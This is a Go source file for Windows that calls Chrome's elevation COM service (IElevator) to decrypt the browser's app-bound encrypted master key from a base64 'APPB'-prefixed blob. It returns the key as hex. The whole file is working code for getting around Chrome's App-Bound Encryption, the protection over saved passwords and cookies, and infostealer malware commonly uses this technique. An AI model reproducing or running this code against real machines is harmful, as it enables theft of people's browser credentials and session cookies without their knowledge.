package keys

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	// COM constants
	COINIT_APARTMENTTHREADED = 0x2
	CLSCTX_LOCAL_SERVER      = 0x4

	// Authentication levels
	RPC_C_AUTHN_DEFAULT           = 0xFFFFFFFF
	RPC_C_AUTHZ_DEFAULT           = 0xFFFFFFFF
	RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6
	RPC_C_IMP_LEVEL_IMPERSONATE   = 3
	EOAC_DYNAMIC_CLOAKING         = 0x40
)

var (
	// Prefix matching the C header
	kCryptAppBoundKeyPrefix = []byte{'A', 'P', 'P', 'B'}

	// Chrome-specific CLSID and IID
	ChromeCLSID_Elevator = windows.GUID{
		Data1: 0x708860E0,
		Data2: 0xF641,
		Data3: 0x4611,
		Data4: [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B},
	}

	ChromeIID_IElevator = windows.GUID{
		Data1: 0x463ABECF,
		Data2: 0x410D,
		Data3: 0x407F,
		Data4: [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8},
	}

	ole32    = windows.NewLazySystemDLL("ole32.dll")
	oleaut32 = windows.NewLazySystemDLL("oleaut32.dll")

	procCoInitializeEx        = ole32.NewProc("CoInitializeEx")
	procCoUninitialize        = ole32.NewProc("CoUninitialize")
	procCoCreateInstance      = ole32.NewProc("CoCreateInstance")
	procCoSetProxyBlanket     = ole32.NewProc("CoSetProxyBlanket")
	procSysAllocStringByteLen = oleaut32.NewProc("SysAllocStringByteLen")
	procSysFreeString         = oleaut32.NewProc("SysFreeString")
)

type IElevator struct {
	lpVtbl *IElevatorVtbl
}

type IElevatorVtbl struct {
	QueryInterface         uintptr
	AddRef                 uintptr
	Release                uintptr
	RunRecoveryCRXElevated uintptr
	EncryptData            uintptr
	DecryptData            uintptr
	InstallVPNServices     uintptr
}

func bytesToBSTR(data []byte) uintptr {
	if len(data) == 0 {
		return 0
	}
	ret, _, _ := procSysAllocStringByteLen.Call(
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
	)
	return ret
}

func freeBSTR(bstr uintptr) {
	if bstr != 0 {
		procSysFreeString.Call(bstr)
	}
}

func bstrToBytes(bstr uintptr) []byte {
	if bstr == 0 {
		return nil
	}
	length := *(*int32)(unsafe.Pointer(bstr - 4))
	slice := &struct {
		Data uintptr
		Len  int
		Cap  int
	}{bstr, int(length), int(length)}
	return *(*[]byte)(unsafe.Pointer(slice))
}

func GetAppBoundKey(key string) (string, error) {
	// Initialize COM
	hr, _, _ := procCoInitializeEx.Call(0, uintptr(COINIT_APARTMENTTHREADED))
	if hr != 0 {
		return "", fmt.Errorf("CoInitializeEx failed: %v", hr)
	}
	defer procCoUninitialize.Call()

	// Create an instance of the IElevator COM object
	var elevator *IElevator
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&ChromeCLSID_Elevator)),
		0,
		uintptr(CLSCTX_LOCAL_SERVER),
		uintptr(unsafe.Pointer(&ChromeIID_IElevator)),
		uintptr(unsafe.Pointer(&elevator)),
	)
	if hr != 0 {
		return "", fmt.Errorf("failed to create IElevator instance: %v", hr)
	}

	// Set proxy blanket
	hr, _, _ = procCoSetProxyBlanket.Call(
		uintptr(unsafe.Pointer(elevator)),
		uintptr(RPC_C_AUTHN_DEFAULT),
		uintptr(RPC_C_AUTHZ_DEFAULT),
		0,
		uintptr(RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
		uintptr(RPC_C_IMP_LEVEL_IMPERSONATE),
		0,
		uintptr(EOAC_DYNAMIC_CLOAKING),
	)
	if hr != 0 {
		return "", fmt.Errorf("failed to set proxy blanket: %v", hr)
	}

	// Base64 decode the key
	encryptedKeyWithHeader, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
		return "", fmt.Errorf("base64 decoding failed: %v", err)
	}

	// Validate key header
	if len(encryptedKeyWithHeader) < len(kCryptAppBoundKeyPrefix) ||
		!bytesEqual(encryptedKeyWithHeader[:len(kCryptAppBoundKeyPrefix)], kCryptAppBoundKeyPrefix) {
		return "", fmt.Errorf("invalid key header")
	}

	// Remove prefix
	encryptedKey := encryptedKeyWithHeader[len(kCryptAppBoundKeyPrefix):]
	//fmt.Printf("Encrypted key length after removing prefix: %d\n", len(encryptedKey))

	// Convert to BSTR
	ciphertext := bytesToBSTR(encryptedKey)
	if ciphertext == 0 {
		return "", fmt.Errorf("failed to allocate BSTR for ciphertext")
	}
	defer freeBSTR(ciphertext)

	var plaintext uintptr
	var lastError uint32

	hr = decryptData(elevator, ciphertext, &plaintext, &lastError)
	if hr != 0 {
		if lastError == 13 { // ERROR_INVALID_DATA
			return "", fmt.Errorf("decryption failed: invalid data format (try with full key including prefix)")
		}
		return "", fmt.Errorf("decryption failed. HRESULT: 0x%x, Last error: %d", hr, lastError)
	}

	if plaintext == 0 {
		return "", fmt.Errorf("no plaintext returned")
	}
	defer freeBSTR(plaintext)

	decryptedBytes := bstrToBytes(plaintext)

	// Convert the decrypted key to a hex string
	var buffer bytes.Buffer
	for _, b := range decryptedBytes {
		buffer.WriteString(fmt.Sprintf("\\x%02x", b))
	}

	return buffer.String(), nil
}

func decryptData(elevator *IElevator, ciphertext uintptr, plaintextData *uintptr, lastError *uint32) uintptr {
	r1, _, _ := syscall.Syscall6(
		elevator.lpVtbl.DecryptData,
		4,
		uintptr(unsafe.Pointer(elevator)),
		ciphertext,
		uintptr(unsafe.Pointer(plaintextData)),
		uintptr(unsafe.Pointer(lastError)),
		0,
		0,
	)
	return r1
}

func bytesEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
